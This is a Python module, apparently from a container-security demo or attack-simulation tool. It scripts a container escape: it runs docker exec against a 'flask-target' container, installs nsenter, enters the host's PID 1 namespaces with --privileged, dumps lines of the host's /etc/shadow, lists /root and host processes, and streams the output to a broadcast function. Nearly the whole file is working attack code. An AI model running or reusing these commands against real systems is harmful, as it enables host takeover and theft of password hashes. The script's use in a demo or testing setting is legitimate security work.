import asyncio
from datetime import datetime
from models.attack import AttackRun


ATTACK_COMMANDS = [
    # confirm we're root inside flask-target
    [
        "docker", "exec", "flask-target",
        "sh", "-c", "echo '--- INSIDE CONTAINER ---'; id; hostname; cat /proc/1/cgroup | head -5"
    ],
    # check nsenter is available
    [
        "docker", "exec", "flask-target",
        "sh", "-c", "which nsenter && nsenter --version 2>&1 || echo 'nsenter not found, trying install'; "
                    "apt-get install -y util-linux -q 2>/dev/null | tail -1; which nsenter"
    ],
    # nsenter into host PID 1 namespaces
    [
        "docker", "exec", "--privileged", "flask-target",
        "nsenter", "-t", "1", "-m", "-u", "-n", "-i",
        "sh", "-c",
        "echo '--- HOST NAMESPACE SHELL ---'; "
        "id; hostname; uname -r; "
        "echo '--- HOST /etc/shadow (first 5 lines) ---'; cat /etc/shadow 2>/dev/null | head -5; "
        "echo '--- HOST /root contents ---'; ls -la /root 2>/dev/null; "
        "echo '--- HOST PROCESSES ---'; ps aux 2>/dev/null | head -10; "
        "echo '--- NSENTER ESCAPE COMPLETE ---'"
    ],
]


async def run(run: AttackRun, broadcast_fn) -> None:
    for cmd in ATTACK_COMMANDS:
        await broadcast_fn(f"[>] CMD: {' '.join(cmd[2:])}")
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        async for line in proc.stdout:
            text = line.decode(errors="replace").rstrip()
            run.output.append(text)
            await broadcast_fn(text)
        await proc.wait()
        if proc.returncode != 0:
            run.exit_code = proc.returncode

    run.finished_at = datetime.utcnow()
    run.exit_code = run.exit_code if run.exit_code is not None else 0
    run.status = "success" if run.exit_code == 0 else "failed"
    run.duration_seconds = (run.finished_at - run.started_at).total_seconds()
    await broadcast_fn(
        f"[+] ATTACK COMPLETE  exit_code={run.exit_code}  duration={run.duration_seconds:.1f}s"
    )
